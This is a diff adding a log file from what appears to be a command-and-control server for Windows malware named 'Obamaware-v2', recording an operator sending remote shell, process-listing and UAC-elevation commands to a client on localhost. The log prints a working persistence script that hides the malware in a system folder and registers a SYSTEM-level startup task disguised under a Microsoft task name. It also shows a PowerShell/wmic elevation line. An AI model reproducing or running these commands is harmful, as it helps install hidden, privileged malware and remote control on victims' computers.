@@ -1,0 +1,1851 @@
+[2026-01-20 12:05:17] --LOG-FILE-START--
+[2026-01-20 12:05:17] Server listening on 0.0.0.0:8576
+[2026-01-20 13:18:10] Connected: ('127.0.0.1', 60918)
+[2026-01-20 13:18:11] ('127.0.0.1', 60918) is admin
+[2026-01-20 13:18:13] waiting for admin commands...
+[2026-01-20 13:18:13] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 13:18:13] Waiting for client Reply...
+[2026-01-20 13:18:13] No Client connected.
+[2026-01-20 13:18:13] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 13:18:13] iterated admin loop
+[2026-01-20 13:18:14] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 13:18:14] waiting for admin commands...
+[2026-01-20 13:18:15] Connected: ('127.0.0.1', 60922)
+[2026-01-20 13:18:16] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 13:18:16] Waiting for client Reply...
+[2026-01-20 13:18:16] No Client connected.
+[2026-01-20 13:18:16] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 13:18:16] iterated admin loop
+[2026-01-20 13:18:16] Set Client to: ('127.0.0.1', 60922)
+[2026-01-20 13:18:17] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 13:18:17] waiting for admin commands...
+[2026-01-20 13:18:18] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 13:18:18] Waiting for client Reply...
+[2026-01-20 13:18:18] [send_ws] sending 25 bytes: 81 17 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 65 63 68 6F 20 68 69  ascii='�\x17__EXECUTE__ ### echo hi'
+[2026-01-20 13:18:25] Reply from Client: C:\Windows\System32
+hi
+[2026-01-20 13:18:25] [send_ws] sending 25 bytes: 81 17 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 68 69  ascii='�\x17C:\\Windows\\System32\r\nhi'
+[2026-01-20 13:18:25] iterated admin loop
+[2026-01-20 13:18:25] waiting for admin commands...
+[2026-01-20 13:18:28] Command from Admin: __EXECUTE__ ### echo hello
+[2026-01-20 13:18:28] Waiting for client Reply...
+[2026-01-20 13:18:28] [send_ws] sending 28 bytes: 81 1A 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 65 63 68 6F 20 68 65 6C 6C 6F  ascii='�\x1a__EXECUTE__ ### echo hello'
+[2026-01-20 13:18:32] Reply from Client: C:\Windows\System32
+hello
+[2026-01-20 13:18:32] [send_ws] sending 28 bytes: 81 1A 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 68 65 6C 6C 6F  ascii='�\x1aC:\\Windows\\System32\r\nhello'
+[2026-01-20 13:18:32] iterated admin loop
+[2026-01-20 13:18:32] waiting for admin commands...
+[2026-01-20 13:18:39] Command from Admin: __DOWNGRADE__
+[2026-01-20 13:18:39] Waiting for client Reply...
+[2026-01-20 13:18:39] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 13:18:52] No reply from Client.
+[2026-01-20 13:18:52] [send_ws] sending 24 bytes: 81 16 5B 4E 6F 20 52 65 70 6C 79 20 66 72 6F 6D 20 43 6C 69 65 6E 74 5D  ascii='�\x16[No Reply from Client]'
+[2026-01-20 13:18:52] iterated admin loop
+[2026-01-20 13:18:52] waiting for admin commands...
+[2026-01-20 13:18:52] admin socket dead.
+[2026-01-20 13:18:52] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 13:18:52] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 13:18:52] [WARN] Failed to send data: [Errno 32] Broken pipe
+[2026-01-20 13:18:52] iterated admin loop
+[2026-01-20 13:18:52] Client disconnected: ('127.0.0.1', 60918)
+[2026-01-20 13:18:52] Client disconnected: ('127.0.0.1', 60922)
+[2026-01-20 15:10:26] Connected: ('127.0.0.1', 39654)
+[2026-01-20 15:10:27] ('127.0.0.1', 39654) is admin
+[2026-01-20 15:10:28] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 15:10:28] waiting for admin commands...
+[2026-01-20 15:10:29] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 15:10:29] Waiting for client Reply...
+[2026-01-20 15:10:29] No Client connected.
+[2026-01-20 15:10:29] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 15:10:29] iterated admin loop
+[2026-01-20 15:10:30] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 15:10:30] waiting for admin commands...
+[2026-01-20 15:10:30] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 15:10:30] Waiting for client Reply...
+[2026-01-20 15:10:30] No Client connected.
+[2026-01-20 15:10:30] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 15:10:30] iterated admin loop
+[2026-01-20 15:10:31] [send_ws] sending 47 bytes: 81 2D 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64 2E 0A 20 20 20 20 20 20 20 57 61 69 74 69 6E 67 2E 2E 2E  ascii='�-[WARN] No Client Connected.\n       Waiting...'
+[2026-01-20 15:10:31] waiting for admin commands...
+[2026-01-20 15:10:31] Connected: ('127.0.0.1', 56040)
+[2026-01-20 15:10:32] Set Client to: ('127.0.0.1', 56040)
+[2026-01-20 15:10:32] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 15:10:32] Waiting for client Reply...
+[2026-01-20 15:10:32] No Client connected.
+[2026-01-20 15:10:32] [send_ws] sending 28 bytes: 81 1A 5B 57 41 52 4E 5D 20 4E 6F 20 43 6C 69 65 6E 74 20 43 6F 6E 6E 65 63 74 65 64  ascii='�\x1a[WARN] No Client Connected'
+[2026-01-20 15:10:32] iterated admin loop
+[2026-01-20 15:10:32] waiting for admin commands...
+[2026-01-20 15:10:45] Command from Admin: __EXECUTE__ ### type %LOCALAPPDATA%/Obamaware-v2/elevate.cmd
+[2026-01-20 15:10:45] Waiting for client Reply...
+[2026-01-20 15:10:45] [send_ws] sending 62 bytes: 81 3C 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 74 79 70 65 20 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25 2F 4F 62 61 6D 61 77 61 72 65 2D 76 32 2F 65 6C 65 76 61 74 65 2E 63 6D 64  ascii='�<__EXECUTE__ ### type %LOCALAPPDATA%/Obamaware-v2/elevate.cmd'
+[2026-01-20 15:10:45] Reply from Client: C:\Windows\System32
+Syntaxfehler.
+[2026-01-20 15:10:45] [send_ws] sending 36 bytes: 81 22 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 53 79 6E 74 61 78 66 65 68 6C 65 72 2E  ascii='�"C:\\Windows\\System32\r\nSyntaxfehler.'
+[2026-01-20 15:10:45] iterated admin loop
+[2026-01-20 15:10:45] waiting for admin commands...
+[2026-01-20 15:10:51] Command from Admin: __EXECUTE__ ### type "%LOCALAPPDATA%/Obamaware-v2/elevate.cmd"
+[2026-01-20 15:10:51] Waiting for client Reply...
+[2026-01-20 15:10:51] [send_ws] sending 64 bytes: 81 3E 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 74 79 70 65 20 22 25 4C 4F 43 41 4C 41 50 50 44 41 54 41 25 2F 4F 62 61 6D 61 77 61 72 65 2D 76 32 2F 65 6C 65 76 61 74 65 2E 63 6D 64 22  ascii='�>__EXECUTE__ ### type "%LOCALAPPDATA%/Obamaware-v2/elevate.cmd"'
+[2026-01-20 15:10:51] Reply from Client: C:\Windows\System32
+@echo off
+md %windir%\bin 2>nul
+xcopy "%LOCALAPPDATA%\Obamaware-v2" "%windir%\bin" /E /I /Y /Q
+attrib +h +s "C:\Windows\bin"
+schtasks /create /tn "\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTask" /tr "cmd /c \"%windir%\bin\win_start.cmd\"" /sc onstart /ru SYSTEM /f /rl HIGHEST /it /delay 0000:05 >nul 2>&1
+REM powershell -c "Start-Process wmic -ArgumentList 'process call create \"cmd.exe /c %LOCALAPPDATA%\Obamaware-v2\elevate.cmd\"' -Verb RunAs"
+[2026-01-20 15:10:51] [send_ws] sending 486 bytes: 81 7E 01 E2 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 40 65 63 68 6F 20 6F 66 66 0A 6D 64 20 25 77 69 6E 64 69 72 25 5C 62 69 6E 20 32 3E 6E 75 6C 0A 78 63 6F 70 79 20 22 ...  ascii='�~\x01�C:\\Windows\\System32\r\n@echo off\nmd %windir%\\bin 2>nul\nxcopy "%LOCALAPPDATA%\\Obamaware-v2" "%windir%\\bin" /E /I /Y /Q\nattrib +h +s "C:\\Windows\\bin"\nschtasks /create /tn "\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask" /tr "cmd /c \\"%windir%\\bin\\win_start.cmd\\"" /sc onstart /ru SYSTEM /f /rl HIGHEST /it /delay 0000:05 >nul 2>&1\nREM powershell -c "Start-Process wmic -ArgumentList \'process call create \\"cmd.exe /c %LOCALAPPDATA%\\Obamaware-v2\\elevate.cmd\\"\' -Verb RunAs"'
+[2026-01-20 15:10:51] iterated admin loop
+[2026-01-20 15:10:51] waiting for admin commands...
+[2026-01-20 15:11:11] iterated admin loop
+[2026-01-20 15:11:11] waiting for admin commands...
+[2026-01-20 15:11:31] iterated admin loop
+[2026-01-20 15:11:31] waiting for admin commands...
+[2026-01-20 15:11:51] iterated admin loop
+[2026-01-20 15:11:51] waiting for admin commands...
+[2026-01-20 15:12:11] iterated admin loop
+[2026-01-20 15:12:11] waiting for admin commands...
+[2026-01-20 15:12:31] iterated admin loop
+[2026-01-20 15:12:31] waiting for admin commands...
+[2026-01-20 15:12:51] iterated admin loop
+[2026-01-20 15:12:51] waiting for admin commands...
+[2026-01-20 15:13:11] iterated admin loop
+[2026-01-20 15:13:11] waiting for admin commands...
+[2026-01-20 15:13:31] iterated admin loop
+[2026-01-20 15:13:31] waiting for admin commands...
+[2026-01-20 15:13:51] iterated admin loop
+[2026-01-20 15:13:51] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] waiting for admin commands...
+[2026-01-20 15:13:59] No command from Admin, resetting connection...
+[2026-01-20 15:13:59] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 15:13:59] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 15:13:59] iterated admin loop
+[2026-01-20 15:13:59] Client disconnected: ('127.0.0.1', 39654)
+[2026-01-20 15:13:59] Client disconnected: ('127.0.0.1', 56040)
+[2026-01-20 15:21:22] Connected: ('127.0.0.1', 50404)
+[2026-01-20 15:21:22] ('127.0.0.1', 50404) is admin
+[2026-01-20 15:21:23] Connected: ('127.0.0.1', 50408)
+[2026-01-20 15:21:23] Set Client to: ('127.0.0.1', 50408)
+[2026-01-20 15:21:24] waiting for admin commands...
+[2026-01-20 15:21:24] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 15:21:24] Waiting for client Reply...
+[2026-01-20 15:21:24] [send_ws] sending 25 bytes: 81 17 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 65 63 68 6F 20 68 69  ascii='�\x17__EXECUTE__ ### echo hi'
+[2026-01-20 15:21:24] Reply from Client: C:\Windows\System32
+hi
+[2026-01-20 15:21:24] [send_ws] sending 25 bytes: 81 17 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 68 69  ascii='�\x17C:\\Windows\\System32\r\nhi'
+[2026-01-20 15:21:24] iterated admin loop
+[2026-01-20 15:21:24] waiting for admin commands...
+[2026-01-20 15:21:27] Command from Admin: __PROC__
+[2026-01-20 15:21:27] Waiting for client Reply...
+[2026-01-20 15:21:27] [send_ws] sending 10 bytes: 81 08 5F 5F 50 52 4F 43 5F 5F  ascii='�\x08__PROC__'
+[2026-01-20 15:21:27] Reply from Client: Explorer.EXE
+[2026-01-20 15:21:27] [send_ws] sending 14 bytes: 81 0C 45 78 70 6C 6F 72 65 72 2E 45 58 45  ascii='�\x0cExplorer.EXE'
+[2026-01-20 15:21:27] iterated admin loop
+[2026-01-20 15:21:27] waiting for admin commands...
+[2026-01-20 15:21:47] iterated admin loop
+[2026-01-20 15:21:47] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] waiting for admin commands...
+[2026-01-20 15:21:56] No command from Admin, resetting connection...
+[2026-01-20 15:21:56] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 15:21:56] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 15:21:56] iterated admin loop
+[2026-01-20 15:21:56] Client disconnected: ('127.0.0.1', 50404)
+[2026-01-20 15:21:56] Client disconnected: ('127.0.0.1', 50408)
+[2026-01-20 15:45:20] Connected: ('127.0.0.1', 58664)
+[2026-01-20 15:45:21] Connected: ('127.0.0.1', 58674)
+[2026-01-20 15:45:21] Set Client to: ('127.0.0.1', 58674)
+[2026-01-20 15:45:21] ('127.0.0.1', 58664) is admin
+[2026-01-20 15:45:21] waiting for admin commands...
+[2026-01-20 15:45:24] Command from Admin: __EXECUTE__ ### echo hi
+[2026-01-20 15:45:24] Waiting for client Reply...
+[2026-01-20 15:45:24] [send_ws] sending 25 bytes: 81 17 5F 5F 45 58 45 43 55 54 45 5F 5F 20 23 23 23 20 65 63 68 6F 20 68 69  ascii='�\x17__EXECUTE__ ### echo hi'
+[2026-01-20 15:45:24] Reply from Client: C:\Windows\System32
+hi
+[2026-01-20 15:45:24] [send_ws] sending 25 bytes: 81 17 43 3A 5C 57 69 6E 64 6F 77 73 5C 53 79 73 74 65 6D 33 32 0D 0A 68 69  ascii='�\x17C:\\Windows\\System32\r\nhi'
+[2026-01-20 15:45:24] iterated admin loop
+[2026-01-20 15:45:24] waiting for admin commands...
+[2026-01-20 15:45:33] Command from Admin: __UAC__ ### elevate
+[2026-01-20 15:45:33] Waiting for client Reply...
+[2026-01-20 15:45:33] [send_ws] sending 21 bytes: 81 13 5F 5F 55 41 43 5F 5F 20 23 23 23 20 65 6C 65 76 61 74 65  ascii='�\x13__UAC__ ### elevate'
+[2026-01-20 15:45:33] Reply from Client: Start-Process : Dieser Befehl kann aufgrund des folgenden Fehlers nicht ausgefhrt werden: Das System kann die 
+angegebene Datei nicht finden.
+In Zeile:1 Zeichen:1
++ Start-Process wmic -ArgumentList 'process call create "cmd.exe /c C:\ ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException
+    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand
+ 
+Started elevation via UAC
+[2026-01-20 15:45:33] [send_ws] sending 551 bytes: 81 7E 02 23 53 74 61 72 74 2D 50 72 6F 63 65 73 73 20 3A 20 44 69 65 73 65 72 20 42 65 66 65 68 6C 20 6B 61 6E 6E 20 61 75 66 67 72 75 6E 64 20 64 65 73 20 66 6F 6C 67 65 6E 64 65 6E 20 46 65 ...  ascii='�~\x02#Start-Process : Dieser Befehl kann aufgrund des folgenden Fehlers nicht ausgefhrt werden: Das System kann die \r\nangegebene Datei nicht finden.\r\nIn Zeile:1 Zeichen:1\r\n+ Start-Process wmic -ArgumentList \'process call create "cmd.exe /c C:\\ ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException\r\n    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand\r\n \r\nStarted elevation via UAC'
+[2026-01-20 15:45:33] iterated admin loop
+[2026-01-20 15:45:33] waiting for admin commands...
+[2026-01-20 15:45:53] iterated admin loop
+[2026-01-20 15:45:53] waiting for admin commands...
+[2026-01-20 15:46:13] iterated admin loop
+[2026-01-20 15:46:13] waiting for admin commands...
+[2026-01-20 15:46:33] iterated admin loop
+[2026-01-20 15:46:33] waiting for admin commands...
+[2026-01-20 15:46:53] iterated admin loop
+[2026-01-20 15:46:53] waiting for admin commands...
+[2026-01-20 15:47:13] iterated admin loop
+[2026-01-20 15:47:13] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] waiting for admin commands...
+[2026-01-20 15:47:27] No command from Admin, resetting connection...
+[2026-01-20 15:47:27] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 15:47:27] [send_ws] sending 58 bytes: 81 38 5B 45 52 52 4F 52 5D 3A 20 63 6F 6E 6E 20 72 65 73 65 74 20 62 79 20 73 65 72 76 65 72 2E 0D 0A 72 65 73 74 61 72 74 20 79 6F 75 72 20 63 6F 6E 6E 65 63 74 69 6F 6E 2E  ascii='�8[ERROR]: conn reset by server.\r\nrestart your connection.'
+[2026-01-20 15:47:27] iterated admin loop
+[2026-01-20 15:47:27] Client disconnected: ('127.0.0.1', 58664)
+[2026-01-20 15:47:27] Client disconnected: ('127.0.0.1', 58674)
+[2026-01-20 17:08:55] Connected: ('127.0.0.1', 51804)
+[2026-01-20 17:08:55] ('127.0.0.1', 51804) is admin
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] iterated admin loop
+[2026-01-20 17:08:57] waiting for admin commands...
+[2026-01-20 17:08:57] No command from Admin, resetting connection...
+[2026-01-20 17:08:57] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 17:08:57] [WARN] Failed to send data: 'NoneType' object has no attribute 'sendall'
+[2026-01-20 17:08:57] [WARN] Admin disconnected or error: 'NoneType' object has no attribute 'close'
+[2026-01-20 17:08:57] Client disconnected: ('127.0.0.1', 51804)
+[2026-01-20 17:09:36] Connected: ('127.0.0.1', 43406)
+[2026-01-20 17:09:36] ('127.0.0.1', 43406) is admin
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] iterated admin loop
+[2026-01-20 17:09:37] waiting for admin commands...
+[2026-01-20 17:09:37] No command from Admin, resetting connection...
+[2026-01-20 17:09:37] [send_ws] sending 15 bytes: 81 0D 5F 5F 44 4F 57 4E 47 52 41 44 45 5F 5F  ascii='�\r__DOWNGRADE__'
+[2026-01-20 17:09:37] [WARN] Failed to send data: 'NoneType' object has no attribute 'sendall'
+[2026-01-20 17:09:37] [WARN] Admin disconnected or error: 'NoneType' object has no attribute 'close'
+[2026-01-20 17:09:37] Client disconnected: ('127.0.0.1', 43406)
+[2026-01-20 17:14:09] Connected: ('127.0.0.1', 36870)
+[2026-01-20 17:14:09] ('127.0.0.1', 36870) is admin
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
+[2026-01-20 17:14:10] waiting for admin commands...
+[2026-01-20 17:14:10] iterated admin loop
